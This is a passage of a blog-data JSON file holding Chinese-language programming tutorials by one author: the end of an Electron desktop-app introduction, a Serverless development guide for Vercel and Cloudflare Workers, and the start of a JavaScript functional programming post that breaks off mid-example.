\u7ed9\u6e32\u67d3\u8fdb\u7a0b\\ncontextBridge.exposeInMainWorld(\'electronAPI\', {\\n  // \u53d1\u9001\u6d88\u606f\u5230\u4e3b\u8fdb\u7a0b\\n  sendMessage: (channel, data) => {\\n    const validChannels = [\'save-file\', \'open-dialog\'];\\n    if (validChannels.includes(channel)) {\\n      ipcRenderer.send(channel, data);\\n    }\\n  },\\n\\n  // \u8c03\u7528\u4e3b\u8fdb\u7a0b\u65b9\u6cd5\u5e76\u7b49\u5f85\u7ed3\u679c\\n  readFile: (filePath) => ipcRenderer.invoke(\'read-file\', filePath),\\n\\n  // \u76d1\u542c\u4e3b\u8fdb\u7a0b\u6d88\u606f\\n  onUpdateAvailable: (callback) => {\\n    ipcRenderer.on(\'update-available\', (event, ...args) => callback(...args));\\n  },\\n\\n  // \u83b7\u53d6\u5e73\u53f0\u4fe1\u606f\\n  platform: process.platform,\\n});\\n```\\n\\n---\\n\\n## \ud83d\udda5\ufe0f \u6e32\u67d3\u8fdb\u7a0b\\n\\n```html\\n\x3c!-- renderer/index.html --\x3e\\n<!DOCTYPE html>\\n<html>\\n<head>\\n  <meta charset=\\"UTF-8\\">\\n  <title>My Electron App</title>\\n  <link rel=\\"stylesheet\\" href=\\"style.css\\">\\n  <meta http-equiv=\\"Content-Security-Policy\\" \\n        content=\\"default-src \'self\'; script-src \'self\'\\">\\n</head>\\n<body>\\n  <div id=\\"app\\">\\n    <h1>Hello Electron!</h1>\\n    <button id=\\"read-btn\\">Read File</button>\\n    <pre id=\\"content\\"></pre>\\n  </div>\\n  <script src=\\"renderer.js\\"><\/script>\\n</body>\\n</html>\\n```\\n\\n```javascript\\n// renderer/renderer.js\\ndocument.getElementById(\'read-btn\').addEventListener(\'click\', async () => {\\n  try {\\n    const content = await window.electronAPI.readFile(\'./package.json\');\\n    document.getElementById(\'content\').textContent = content;\\n  } catch (error) {\\n    console.error(\'Error reading file:\', error);\\n  }\\n});\\n```\\n\\n---\\n\\n## \ud83d\udce1 \u8fdb\u7a0b\u901a\u4fe1 (IPC)\\n\\n### \u6e32\u67d3\u8fdb\u7a0b \u2192 \u4e3b\u8fdb\u7a0b\\n\\n```javascript\\n// \u6e32\u67d3\u8fdb\u7a0b\\nwindow.electronAPI.sendMessage(\'save-file\', { data: \'content\' });\\n\\n// \u4e3b\u8fdb\u7a0b\\nipcMain.on(\'save-file\', (event, args) => {\\n  console.log(\'Received:\', args);\\n  event.reply(\'save-complete\', { success: true });\\n});\\n```\\n\\n### \u4e3b\u8fdb\u7a0b \u2192 \u6e32\u67d3\u8fdb\u7a0b\\n\\n```javascript\\n// \u4e3b\u8fdb\u7a0b\\nmainWindow.webContents.send(\'update-available\', { version: \'2.0.0\' });\\n\\n// \u9884\u52a0\u8f7d\u811a\u672c\\ncontextBridge.exposeInMainWorld(\'electronAPI\', {\\n  onUpdateAvailable: (callback) => {\\n    ipcRenderer.on(\'update-available\', (event, data) => callback(data));\\n  },\\n});\\n\\n// \u6e32\u67d3\u8fdb\u7a0b\\nwindow.electronAPI.onUpdateAvailable((data) => {\\n  console.log(\'New version:\', data.version);\\n});\\n```\\n\\n### \u53cc\u5411\u901a\u4fe1\\n\\n```javascript\\n// \u4e3b\u8fdb\u7a0b\\nipcMain.handle(\'get-user\', async (event, userId) => {\\n  const user = await db.getUser(userId);\\n  return user;\\n});\\n\\n// \u6e32\u67d3\u8fdb\u7a0b\\nconst user = await window.electronAPI.getUser(\'123\');\\n```\\n\\n---\\n\\n## \ud83d\udcc1 \u539f\u751f\u529f\u80fd\\n\\n### \u6587\u4ef6\u5bf9\u8bdd\u6846\\n\\n```javascript\\n// main.js\\nconst { dialog } = require(\'electron\');\\n\\nipcMain.handle(\'open-file-dialog\', async () => {\\n  const result = await dialog.showOpenDialog(mainWindow, {\\n    properties: [\'openFile\'],\\n    filters: [\\n      { name: \'Text Files\', extensions: [\'txt\', \'md\'] },\\n      { name: \'All Files\', extensions: [\'*\'] },\\n    ],\\n  });\\n  return result.filePaths;\\n});\\n\\nipcMain.handle(\'save-file-dialog\', async () => {\\n  const result = await dialog.showSaveDialog(mainWindow, {\\n    filters: [{ name: \'Text Files\', extensions: [\'txt\'] }],\\n  });\\n  return result.filePath;\\n});\\n```\\n\\n### \u7cfb\u7edf\u83dc\u5355\\n\\n```javascript\\nconst { Menu } = require(\'electron\');\\n\\nconst template = [\\n  {\\n    label: \'File\',\\n    submenu: [\\n      {\\n        label: \'Open\',\\n        accelerator: \'CmdOrCtrl+O\',\\n        click: () => openFile(),\\n      },\\n      {\\n        label: \'Save\',\\n        accelerator: \'CmdOrCtrl+S\',\\n        click: () => saveFile(),\\n      },\\n      { type: \'separator\' },\\n      { role: \'quit\' },\\n    ],\\n  },\\n  {\\n    label: \'Edit\',\\n    submenu: [\\n      { role: \'undo\' },\\n      { role: \'redo\' },\\n      { type: \'separator\' },\\n      { role: \'cut\' },\\n      { role: \'copy\' },\\n      { role: \'paste\' },\\n    ],\\n  },\\n];\\n\\nconst menu = Menu.buildFromTemplate(template);\\nMenu.setApplicationMenu(menu);\\n```\\n\\n### \u7cfb\u7edf\u6258\u76d8\\n\\n```javascript\\nconst { Tray, Menu } = require(\'electron\');\\n\\nlet tray;\\n\\napp.whenReady().then(() => {\\n  tray = new Tray(\'assets/icon.png\');\\n  \\n  const contextMenu = Menu.buildFromTemplate([\\n    { label: \'Show App\', click: () => mainWindow.show() },\\n    { type: \'separator\' },\\n    { label: \'Quit\', click: () => app.quit() },\\n  ]);\\n  \\n  tray.setToolTip(\'My Electron App\');\\n  tray.setContextMenu(contextMenu);\\n  \\n  tray.on(\'click\', () => {\\n    mainWindow.isVisible() ? mainWindow.hide() : mainWindow.show();\\n  });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u6253\u5305\u53d1\u5e03\\n\\n### electron-builder \u914d\u7f6e\\n\\n```json\\n// package.json\\n{\\n  \\"build\\": {\\n    \\"appId\\": \\"com.example.myapp\\",\\n    \\"productName\\": \\"My App\\",\\n    \\"directories\\": {\\n      \\"output\\": \\"dist\\"\\n    },\\n    \\"mac\\": {\\n      \\"category\\": \\"public.app-category.productivity\\",\\n      \\"target\\": [\\"dmg\\", \\"zip\\"]\\n    },\\n    \\"win\\": {\\n      \\"target\\": [\\"nsis\\", \\"portable\\"]\\n    },\\n    \\"linux\\": {\\n      \\"target\\": [\\"AppImage\\", \\"deb\\"]\\n    }\\n  }\\n}\\n```\\n\\n### \u6784\u5efa\u547d\u4ee4\\n\\n```bash\\n# \u6784\u5efa\u5f53\u524d\u5e73\u53f0\\nnpm run build\\n\\n# \u6784\u5efa\u7279\u5b9a\u5e73\u53f0\\nnpx electron-builder --mac\\nnpx electron-builder --win\\nnpx electron-builder --linux\\n```\\n\\n---\\n\\n## \u26a1 \u6027\u80fd\u4f18\u5316\\n\\n```markdown\\n1. \u5ef6\u8fdf\u52a0\u8f7d\u6a21\u5757\\n2. \u51cf\u5c11\u7a97\u53e3\u6570\u91cf\\n3. \u4f7f\u7528 Web Workers\\n4. \u5408\u7406\u4f7f\u7528 IPC\\n5. \u6253\u5305\u65f6\u6392\u9664 devDependencies\\n```\\n\\n---\\n\\n## \ud83d\udccb \u63a8\u8350\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| electron-builder | \u6253\u5305 |\\n| electron-updater | \u81ea\u52a8\u66f4\u65b0 |\\n| electron-store | \u6301\u4e45\u5316\u5b58\u50a8 |\\n| electron-log | \u65e5\u5fd7 |\\n\\n---\\n\\nElectron \u867d\u7136\u6709\u5185\u5b58\u5360\u7528\u5927\u7684\u7f3a\u70b9\uff0c\u4f46\u5f00\u53d1\u6548\u7387\u548c\u8de8\u5e73\u53f0\u80fd\u529b\u662f\u5b83\u7684\u6838\u5fc3\u4f18\u52bf\u3002"},{"id":"serverless-guide","metadata":{"permalink":"/blog/serverless-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-06-01-serverless.md","source":"@site/blog/2025-06-01-serverless.md","title":"Serverless \u5e94\u7528\u5f00\u53d1\u6307\u5357","description":"Serverless \u8ba9\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u903b\u8f91\uff0c\u65e0\u9700\u7ba1\u7406\u670d\u52a1\u5668\u3002\u672c\u6587\u4ecb\u7ecd Serverless \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u3002","date":"2025-06-01T00:00:00.000Z","tags":[{"inline":true,"label":"Serverless","permalink":"/blog/tags/serverless"},{"inline":true,"label":"\u4e91\u539f\u751f","permalink":"/blog/tags/\u4e91\u539f\u751f"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"}],"readingTime":4.27,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"serverless-guide","title":"Serverless \u5e94\u7528\u5f00\u53d1\u6307\u5357","authors":"mason","tags":["Serverless","\u4e91\u539f\u751f","\u540e\u7aef"]},"unlisted":false,"prevItem":{"title":"Electron \u684c\u9762\u5e94\u7528\u5165\u95e8","permalink":"/blog/electron-intro"},"nextItem":{"title":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u5b9e\u8df5","permalink":"/blog/functional-programming"}},"content":"Serverless \u8ba9\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u903b\u8f91\uff0c\u65e0\u9700\u7ba1\u7406\u670d\u52a1\u5668\u3002\u672c\u6587\u4ecb\u7ecd Serverless \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f Serverless\\n\\n```markdown\\nServerless \u2260 \u6ca1\u6709\u670d\u52a1\u5668\\nServerless = \u65e0\u9700\u7ba1\u7406\u670d\u52a1\u5668\\n\\n\u6838\u5fc3\u7279\u70b9\uff1a\\n- \u6309\u9700\u6267\u884c\uff0c\u6309\u91cf\u8ba1\u8d39\\n- \u81ea\u52a8\u6269\u7f29\u5bb9\\n- \u65e0\u9700\u8fd0\u7ef4\\n- \u4e8b\u4ef6\u9a71\u52a8\\n```\\n\\n### \u5bf9\u6bd4\u4f20\u7edf\u67b6\u6784\\n\\n| \u7ef4\u5ea6 | \u4f20\u7edf\u670d\u52a1\u5668 | Serverless |\\n|------|-----------|------------|\\n| \u670d\u52a1\u5668\u7ba1\u7406 | \u9700\u8981 | \u4e0d\u9700\u8981 |\\n| \u8ba1\u8d39\u65b9\u5f0f | \u6309\u65f6\u95f4 | \u6309\u8c03\u7528\u6b21\u6570 |\\n| \u6269\u7f29\u5bb9 | \u624b\u52a8/\u81ea\u52a8 | \u81ea\u52a8 |\\n| \u51b7\u542f\u52a8 | \u65e0 | \u6709 |\\n| \u6700\u5927\u6267\u884c\u65f6\u95f4 | \u65e0\u9650 | \u6709\u9650\u5236 |\\n\\n---\\n\\n## \ud83c\udfd7\ufe0f \u4e3b\u6d41\u5e73\u53f0\\n\\n| \u5e73\u53f0 | \u670d\u52a1\u540d\u79f0 | \u7279\u70b9 |\\n|------|---------|------|\\n| AWS | Lambda | \u6700\u6210\u719f |\\n| \u963f\u91cc\u4e91 | \u51fd\u6570\u8ba1\u7b97 | \u56fd\u5185\u9996\u9009 |\\n| Vercel | Edge Functions | \u524d\u7aef\u53cb\u597d |\\n| Cloudflare | Workers | \u8fb9\u7f18\u8ba1\u7b97 |\\n| Netlify | Functions | \u7b80\u5355\u6613\u7528 |\\n\\n---\\n\\n## \ud83d\udce6 Vercel Serverless Functions\\n\\n### \u9879\u76ee\u7ed3\u6784\\n\\n```\\nmy-app/\\n\u251c\u2500\u2500 api/\\n\u2502   \u251c\u2500\u2500 hello.ts        # GET /api/hello\\n\u2502   \u251c\u2500\u2500 users/\\n\u2502   \u2502   \u251c\u2500\u2500 index.ts    # GET /api/users\\n\u2502   \u2502   \u2514\u2500\u2500 [id].ts     # GET /api/users/:id\\n\u2502   \u2514\u2500\u2500 posts/\\n\u2502       \u2514\u2500\u2500 create.ts   # POST /api/posts/create\\n\u251c\u2500\u2500 package.json\\n\u2514\u2500\u2500 vercel.json\\n```\\n\\n### \u57fa\u7840\u51fd\u6570\\n\\n```typescript\\n// api/hello.ts\\nimport type { VercelRequest, VercelResponse } from \'@vercel/node\';\\n\\nexport default function handler(req: VercelRequest, res: VercelResponse) {\\n  res.status(200).json({ message: \'Hello, World!\' });\\n}\\n```\\n\\n### \u5904\u7406\u4e0d\u540c\u65b9\u6cd5\\n\\n```typescript\\n// api/users/index.ts\\nimport type { VercelRequest, VercelResponse } from \'@vercel/node\';\\n\\nexport default async function handler(req: VercelRequest, res: VercelResponse) {\\n  switch (req.method) {\\n    case \'GET\':\\n      const users = await getUsers();\\n      return res.status(200).json(users);\\n    \\n    case \'POST\':\\n      const newUser = await createUser(req.body);\\n      return res.status(201).json(newUser);\\n    \\n    default:\\n      res.setHeader(\'Allow\', [\'GET\', \'POST\']);\\n      return res.status(405).end(`Method ${req.method} Not Allowed`);\\n  }\\n}\\n```\\n\\n### \u52a8\u6001\u8def\u7531\\n\\n```typescript\\n// api/users/[id].ts\\nimport type { VercelRequest, VercelResponse } from \'@vercel/node\';\\n\\nexport default async function handler(req: VercelRequest, res: VercelResponse) {\\n  const { id } = req.query;\\n  \\n  if (typeof id !== \'string\') {\\n    return res.status(400).json({ error: \'Invalid ID\' });\\n  }\\n\\n  const user = await getUserById(id);\\n  \\n  if (!user) {\\n    return res.status(404).json({ error: \'User not found\' });\\n  }\\n\\n  return res.status(200).json(user);\\n}\\n```\\n\\n---\\n\\n## \u26a1 Cloudflare Workers\\n\\n### \u57fa\u7840\u793a\u4f8b\\n\\n```typescript\\n// src/index.ts\\nexport default {\\n  async fetch(request: Request): Promise<Response> {\\n    const url = new URL(request.url);\\n    \\n    if (url.pathname === \'/api/hello\') {\\n      return new Response(JSON.stringify({ message: \'Hello!\' }), {\\n        headers: { \'Content-Type\': \'application/json\' },\\n      });\\n    }\\n    \\n    return new Response(\'Not Found\', { status: 404 });\\n  },\\n};\\n```\\n\\n### \u4f7f\u7528 Hono \u6846\u67b6\\n\\n```typescript\\nimport { Hono } from \'hono\';\\n\\nconst app = new Hono();\\n\\napp.get(\'/\', (c) => c.text(\'Hello Hono!\'));\\n\\napp.get(\'/api/users\', async (c) => {\\n  const users = await getUsers();\\n  return c.json(users);\\n});\\n\\napp.post(\'/api/users\', async (c) => {\\n  const body = await c.req.json();\\n  const user = await createUser(body);\\n  return c.json(user, 201);\\n});\\n\\nexport default app;\\n```\\n\\n---\\n\\n## \ud83d\uddc4\ufe0f \u6570\u636e\u5b58\u50a8\\n\\n### Vercel KV (Redis)\\n\\n```typescript\\nimport { kv } from \'@vercel/kv\';\\n\\n// \u8bbe\u7f6e\u503c\\nawait kv.set(\'user:1\', { name: \'John\', email: \'john@example.com\' });\\n\\n// \u83b7\u53d6\u503c\\nconst user = await kv.get(\'user:1\');\\n\\n// \u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\\nawait kv.set(\'session:abc\', data, { ex: 3600 }); // 1\u5c0f\u65f6\\n\\n// \u5217\u8868\u64cd\u4f5c\\nawait kv.lpush(\'queue\', \'task1\');\\nconst task = await kv.rpop(\'queue\');\\n```\\n\\n### Vercel Postgres\\n\\n```typescript\\nimport { sql } from \'@vercel/postgres\';\\n\\n// \u67e5\u8be2\\nconst { rows } = await sql`SELECT * FROM users WHERE id = ${userId}`;\\n\\n// \u63d2\u5165\\nawait sql`INSERT INTO users (name, email) VALUES (${name}, ${email})`;\\n\\n// \u4e8b\u52a1\\nawait sql.begin(async (sql) => {\\n  await sql`UPDATE accounts SET balance = balance - ${amount} WHERE id = ${from}`;\\n  await sql`UPDATE accounts SET balance = balance + ${amount} WHERE id = ${to}`;\\n});\\n```\\n\\n### Cloudflare D1 (SQLite)\\n\\n```typescript\\nexport default {\\n  async fetch(request: Request, env: Env) {\\n    const { results } = await env.DB.prepare(\\n      \'SELECT * FROM users WHERE id = ?\'\\n    ).bind(1).all();\\n    \\n    return Response.json(results);\\n  },\\n};\\n```\\n\\n---\\n\\n## \ud83d\udd10 \u8ba4\u8bc1\u4e0e\u5b89\u5168\\n\\n### JWT \u9a8c\u8bc1\\n\\n```typescript\\nimport jwt from \'jsonwebtoken\';\\n\\nexport default async function handler(req: VercelRequest, res: VercelResponse) {\\n  const token = req.headers.authorization?.replace(\'Bearer \', \'\');\\n  \\n  if (!token) {\\n    return res.status(401).json({ error: \'Unauthorized\' });\\n  }\\n\\n  try {\\n    const decoded = jwt.verify(token, process.env.JWT_SECRET!);\\n    req.user = decoded;\\n  } catch (error) {\\n    return res.status(401).json({ error: \'Invalid token\' });\\n  }\\n\\n  // \u7ee7\u7eed\u5904\u7406...\\n}\\n```\\n\\n### CORS \u5904\u7406\\n\\n```typescript\\nexport default function handler(req: VercelRequest, res: VercelResponse) {\\n  // \u8bbe\u7f6e CORS \u5934\\n  res.setHeader(\'Access-Control-Allow-Origin\', \'*\');\\n  res.setHeader(\'Access-Control-Allow-Methods\', \'GET, POST, OPTIONS\');\\n  res.setHeader(\'Access-Control-Allow-Headers\', \'Content-Type, Authorization\');\\n\\n  // \u5904\u7406\u9884\u68c0\u8bf7\u6c42\\n  if (req.method === \'OPTIONS\') {\\n    return res.status(200).end();\\n  }\\n\\n  // \u7ee7\u7eed\u5904\u7406...\\n}\\n```\\n\\n---\\n\\n## \u23f1\ufe0f \u51b7\u542f\u52a8\u4f18\u5316\\n\\n### \u51cf\u5c11\u5305\u5927\u5c0f\\n\\n```typescript\\n// \u274c \u5bfc\u5165\u6574\u4e2a\u5e93\\nimport _ from \'lodash\';\\n\\n// \u2705 \u6309\u9700\u5bfc\u5165\\nimport debounce from \'lodash/debounce\';\\n```\\n\\n### \u61d2\u52a0\u8f7d\\n\\n```typescript\\n// \u5728\u51fd\u6570\u5916\u90e8\u521d\u59cb\u5316\u7684\u4ee3\u7801\u4f1a\u88ab\u7f13\u5b58\\nlet dbConnection: Database | null = null;\\n\\nexport default async function handler(req, res) {\\n  // \u590d\u7528\u8fde\u63a5\\n  if (!dbConnection) {\\n    dbConnection = await createConnection();\\n  }\\n  \\n  // \u4f7f\u7528\u8fde\u63a5...\\n}\\n```\\n\\n### \u9884\u70ed\\n\\n```typescript\\n// \u5b9a\u65f6\u8c03\u7528\u4fdd\u6301\u70ed\u72b6\u6001\\n// vercel.json\\n{\\n  \\"crons\\": [\\n    {\\n      \\"path\\": \\"/api/health\\",\\n      \\"schedule\\": \\"*/5 * * * *\\"\\n    }\\n  ]\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcca \u76d1\u63a7\u548c\u65e5\u5fd7\\n\\n```typescript\\nexport default async function handler(req: VercelRequest, res: VercelResponse) {\\n  const start = Date.now();\\n  \\n  try {\\n    const result = await processRequest(req);\\n    \\n    console.log({\\n      method: req.method,\\n      path: req.url,\\n      duration: Date.now() - start,\\n      status: 200,\\n    });\\n    \\n    return res.status(200).json(result);\\n  } catch (error) {\\n    console.error({\\n      method: req.method,\\n      path: req.url,\\n      duration: Date.now() - start,\\n      error: error.message,\\n    });\\n    \\n    return res.status(500).json({ error: \'Internal Server Error\' });\\n  }\\n}\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u51fd\u6570\u4fdd\u6301\u5c0f\u800c\u4e13\u6ce8\\n2. \u590d\u7528\u6570\u636e\u5e93\u8fde\u63a5\\n3. \u51cf\u5c11\u4f9d\u8d56\u5305\u5927\u5c0f\\n4. \u4f7f\u7528\u73af\u5883\u53d8\u91cf\u5b58\u50a8\u654f\u611f\u4fe1\u606f\\n5. \u5408\u7406\u8bbe\u7f6e\u8d85\u65f6\u65f6\u95f4\\n6. \u6dfb\u52a0\u9519\u8bef\u5904\u7406\u548c\u65e5\u5fd7\\n7. \u8003\u8651\u51b7\u542f\u52a8\u5f71\u54cd\\n```\\n\\n---\\n\\n## \ud83d\udccb \u9002\u7528\u573a\u666f\\n\\n```markdown\\n\u2705 \u9002\u5408\uff1a\\n- API \u670d\u52a1\\n- Webhook \u5904\u7406\\n- \u5b9a\u65f6\u4efb\u52a1\\n- \u6587\u4ef6\u5904\u7406\\n- \u8fb9\u7f18\u8ba1\u7b97\\n\\n\u274c \u4e0d\u9002\u5408\uff1a\\n- \u957f\u65f6\u95f4\u8fd0\u884c\u7684\u4efb\u52a1\\n- WebSocket \u957f\u8fde\u63a5\\n- \u9700\u8981\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\\n- \u9ad8\u5e76\u53d1\u4f4e\u5ef6\u8fdf\u573a\u666f\\n```\\n\\n---\\n\\nServerless \u964d\u4f4e\u4e86\u540e\u7aef\u5f00\u53d1\u95e8\u69db\uff0c\u662f\u5c0f\u578b\u9879\u76ee\u548c MVP \u7684\u597d\u9009\u62e9\u3002"},{"id":"functional-programming","metadata":{"permalink":"/blog/functional-programming","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-05-10-functional-programming.md","source":"@site/blog/2025-05-10-functional-programming.md","title":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u5b9e\u8df5","description":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u8ba9\u4ee3\u7801\u66f4\u7b80\u6d01\u3001\u53ef\u9884\u6d4b\u3002\u672c\u6587\u4ecb\u7ecd JavaScript \u4e2d\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u3002","date":"2025-05-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u51fd\u6570\u5f0f\u7f16\u7a0b","permalink":"/blog/tags/\u51fd\u6570\u5f0f\u7f16\u7a0b"},{"inline":true,"label":"JavaScript","permalink":"/blog/tags/java-script"},{"inline":true,"label":"\u7f16\u7a0b\u8303\u5f0f","permalink":"/blog/tags/\u7f16\u7a0b\u8303\u5f0f"}],"readingTime":4.66,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"functional-programming","title":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u5b9e\u8df5","authors":"mason","tags":["\u51fd\u6570\u5f0f\u7f16\u7a0b","JavaScript","\u7f16\u7a0b\u8303\u5f0f"]},"unlisted":false,"prevItem":{"title":"Serverless \u5e94\u7528\u5f00\u53d1\u6307\u5357","permalink":"/blog/serverless-guide"},"nextItem":{"title":"\u8bbe\u8ba1\u6a21\u5f0f\u5728\u524d\u7aef\u7684\u5e94\u7528","permalink":"/blog/design-patterns-frontend"}},"content":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u8ba9\u4ee3\u7801\u66f4\u7b80\u6d01\u3001\u53ef\u9884\u6d4b\u3002\u672c\u6587\u4ecb\u7ecd JavaScript \u4e2d\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u51fd\u6570\u5f0f\u7f16\u7a0b\u6838\u5fc3\u6982\u5ff5\\n\\n| \u6982\u5ff5 | \u8bf4\u660e |\\n|------|------|\\n| \u7eaf\u51fd\u6570 | \u76f8\u540c\u8f93\u5165\u603b\u662f\u76f8\u540c\u8f93\u51fa\uff0c\u65e0\u526f\u4f5c\u7528 |\\n| \u4e0d\u53ef\u53d8\u6027 | \u6570\u636e\u4e0d\u53ef\u4fee\u6539\uff0c\u53ea\u80fd\u521b\u5efa\u65b0\u6570\u636e |\\n| \u51fd\u6570\u7ec4\u5408 | \u5c06\u5c0f\u51fd\u6570\u7ec4\u5408\u6210\u590d\u6742\u529f\u80fd |\\n| \u9ad8\u9636\u51fd\u6570 | \u63a5\u6536\u6216\u8fd4\u56de\u51fd\u6570\u7684\u51fd\u6570 |\\n| \u58f0\u660e\u5f0f | \u63cf\u8ff0\u8981\u505a\u4ec0\u4e48\uff0c\u800c\u975e\u600e\u4e48\u505a |\\n\\n---\\n\\n## \u2728 \u7eaf\u51fd\u6570\\n\\n### \u4ec0\u4e48\u662f\u7eaf\u51fd\u6570\\n\\n```javascript\\n// \u2705 \u7eaf\u51fd\u6570\\nfunction add(a, b) {\\n  return a + b;\\n}\\n\\nfunction double(arr) {\\n  return arr.map(x => x * 2);\\n}\\n\\n// \u274c \u975e\u7eaf\u51fd\u6570\\nlet total = 0;\\nfunction addToTotal(value) {\\n  total += value;  // \u4fee\u6539\u5916\u90e8\u72b6\u6001\\n  return total;\\n}\\n\\nfunction getRandomNumber() {\\n  return Math.random();  // \u4e0d\u786e\u5b9a\u7684\u8f93\u51fa\\n}\\n\\nfunction logMessage(msg) {\\n  console.log(msg);  // \u526f\u4f5c\u7528\\n  return msg;\\n}\\n```\\n\\n### \u7eaf\u51fd\u6570\u7684\u597d\u5904\\n\\n```markdown\\n- \u53ef\u6d4b\u8bd5\uff1a\u76f8\u540c\u8f93\u5165\u76f8\u540c\u8f93\u51fa\\n- \u53ef\u7f13\u5b58\uff1a\u7ed3\u679c\u53ef\u4ee5\u88ab memoize\\n- \u53ef\u5e76\u884c\uff1a\u65e0\u5171\u4eab\u72b6\u6001\\n- \u53ef\u63a8\u7406\uff1a\u6613\u4e8e\u7406\u89e3\\n```\\n\\n---\\n\\n## \ud83d\udd12 \u4e0d\u53ef\u53d8\u6027\\n\\n### \u907f\u514d\u4fee\u6539\u6570\u636e\\n\\n```javascript\\n// \u274c \u4fee\u6539\u539f\u6570\u7ec4\\nfunction addItem(arr, item) {\\n  arr.push(item);\\n  return arr;\\n}\\n\\n// \u2705 \u8fd4\u56de\u65b0\u6570\u7ec4\\nfunction addItem(arr, item) {\\n  return [...arr, item];\\n}\\n\\n// \u274c \u4fee\u6539\u539f\u5bf9\u8c61\\nfunction updateUser(user, name) {\\n  user.name = name;\\n  return user;\\n}\\n\\n// \u2705 \u8fd4\u56de\u65b0\u5bf9\u8c61\\nfunction updateUser(user, name) {\\n  return { ...user, name };\\n}\\n```\\n\\n### \u6df1\u5c42\u66f4\u65b0\\n\\n```javascript\\nconst state = {\\n  user: {\\n    profile: {\\n      name: \'John\',\\n      age: 25,\\n    },\\n  },\\n};\\n\\n// \u66f4\u65b0\u5d4c\u5957\u5c5e\u6027\\nconst newState = {\\n  ...state,\\n  user: {\\n    ...state.user,\\n    profile: {\\n      ...state.user.profile,\\n      name: \'Jane\',\\n    },\\n  },\\n};\\n\\n// \u4f7f\u7528 immer \u7b80\u5316\\nimport { produce } from \'immer\';\\n\\nconst newState = produce(state, (draft) => {\\n  draft.user.profile.name = \'Jane\';\\n});\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u9ad8\u9636\u51fd\u6570\\n\\n### \u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\\n\\n```javascript\\n// \u5185\u7f6e\u9ad8\u9636\u51fd\u6570\\nconst numbers = [1, 2, 3, 4, 5];\\n\\nnumbers.map(x => x * 2);        // [2, 4, 6, 8, 10]\\nnumbers.filter(x => x > 2);     // [3, 4, 5]\\nnumbers.reduce((a, b) => a + b); // 15\\nnumbers.find(x => x > 3);       // 4\\nnumbers.every(x => x > 0);      // true\\nnumbers.some(x => x > 4);       // true\\n```\\n\\n### \u51fd\u6570\u4f5c\u4e3a\u8fd4\u56de\u503c\\n\\n```javascript\\n// \u67ef\u91cc\u5316\\nfunction curry(fn) {\\n  return function curried(...args) {\\n    if (args.length >= fn.length) {\\n      return fn.apply(this, args);\\n    }\\n    return function (...moreArgs) {\\n      return curried.apply(this, args.concat(moreArgs));\\n    };\\n  };\\n}\\n\\nconst add = (a, b, c) => a + b + c;\\nconst curriedAdd = curry(add);\\n\\ncurriedAdd(1)(2)(3);    // 6\\ncurriedAdd(1, 2)(3);    // 6\\ncurriedAdd(1)(2, 3);    // 6\\n```\\n\\n### \u504f\u51fd\u6570\u5e94\u7528\\n\\n```javascript\\nfunction partial(fn, ...presetArgs) {\\n  return function (...laterArgs) {\\n    return fn(...presetArgs, ...laterArgs);\\n  };\\n}\\n\\nconst multiply = (a, b) => a * b;\\nconst double = partial(multiply, 2);\\nconst triple = partial(multiply, 3);\\n\\ndouble(5);  // 10\\ntriple(5);  // 15\\n```\\n\\n---\\n\\n## \ud83d\udd17 \u51fd\u6570\u7ec4\u5408\\n\\n### compose \u548c pipe\\n\\n```javascript\\n// \u4ece\u53f3\u5230\u5de6\u6267\u884c\\nconst compose = (...fns) => (x) =>\\n  fns.reduceRight((acc, fn) => fn(acc), x);\\n\\n// \u4ece\u5de6\u5230\u53f3\u6267\u884c\\nconst pipe = (...fns) => (x) =>\\n  fns.reduce((acc, fn) => fn(acc), x);\\n\\n// \u793a\u4f8b\\nconst addOne = x => x + 1;\\nconst double = x => x * 2;\\nconst square = x => x * x;\\n\\nconst composed = compose(square, double, addOne);\\ncomposed(2);  // (2 + 1) * 2 = 6, 6 * 6 = 36\\n\\nconst piped = pipe(addOne, double, square);\\npiped(2);    // \u540c\u6837\u7ed3\u679c\\n```\\n\\n### \u5b9e\u9645\u5e94\u7528\\n\\n```javascript\\n// \u6570\u636e\u5904\u7406\u7ba1\u9053\\nconst users = [\\n  { name: \'John\', age: 25, active: true },\\n  { name: \'Jane\', age: 30, active: false },\\n  { name: \'Bob\', age: 